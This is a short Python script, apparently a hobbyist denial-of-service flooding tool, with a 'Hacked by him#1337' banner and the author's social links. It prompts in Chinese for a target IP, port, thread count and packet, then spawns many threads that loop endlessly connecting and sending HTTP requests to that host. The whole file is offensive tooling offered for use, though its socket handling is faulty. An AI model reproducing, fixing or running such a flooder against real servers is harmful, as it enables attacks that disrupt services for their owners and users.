
'''
def load():
    c = []
    for i in range(10000,20000):
        
        c.append(str(i)[1:5])

    return c 
'''
import socket
import threading
import time
ip=''
port=80
threads = 100
pack=b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
e1='''
**************************************************************
__     ___            _ _             
\ \   / (_)          | (_)            
 \ \_/ / _ _ __      | |_ _ __   __ _ 
  \   / | | '_ \ _   | | | '_ \ / _` |
   | |  | | | | | |__| | | | | | (_| |
   |_|  |_|_| |_|\____/|_|_| |_|\__, |
                                 __/ |
                                |___/
**************************************************************                                
'''

print(e1)
print('Hacked by him#1337\nwelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')

class lodS:
    def __init__(self, host, port, pack):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.host = host
        self.port = port
        self.pack = pack
    
    def syning(self):
        print("Connecting...")
        while True:
            
            try:
                self.client.connect((self.host, self.port))
                self.client.send(self.pack)
                print("\n")
                
                print("Connect-IP:{0} Port:{1}".format(self.host, self.port))
                
                print("\n")
                time.sleep(0.5)
                print("Successfully……")
            except Exception as error:
                print("\n")
                time.sleep(0.5)
                print("Error:" + str(error))
                time.sleep(0.5)
                continue

def input_settings():
    while True:
        try:
            threads = int(input("请输入线程数:\n"))
            port = int(input("请输入端口:\n"))
            pack = input("请设置你的数据包:\n").encode()
            return threads, port, pack
        except ValueError:
            print('输入的不是数字，请重新输入！')

def start():
    global ip, threads, port, pack
    while True:
        print('\n--------------------------------------------------')
        ask = input('是否要进行配置，如不配置将使用默认值（适用于80端口的本机）\n输入y以确认，输入n取消（使用默认值）：\n')
        print('--------------------------------------------------\n')
        if ask.lower() == "y":
            ip = input('请输入ip地址:\n')
            threads, port, pack = input_settings()
            break
        elif ask.lower() == "n":
            ip = '127.0.0.1'
            threads, port, pack = 100, 80, b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
            break
        else:
            print('请输入 y 或 n')

if __name__ == "__main__":
    start()
    pressure = lodS(ip, port, pack)
    thread_list = []
    while True:  
        for _ in range(threads):
            t = threading.Thread(target=pressure.syning)
            t.start()
            thread_list.append(t)
         
        for t in thread_list:
            t.join()
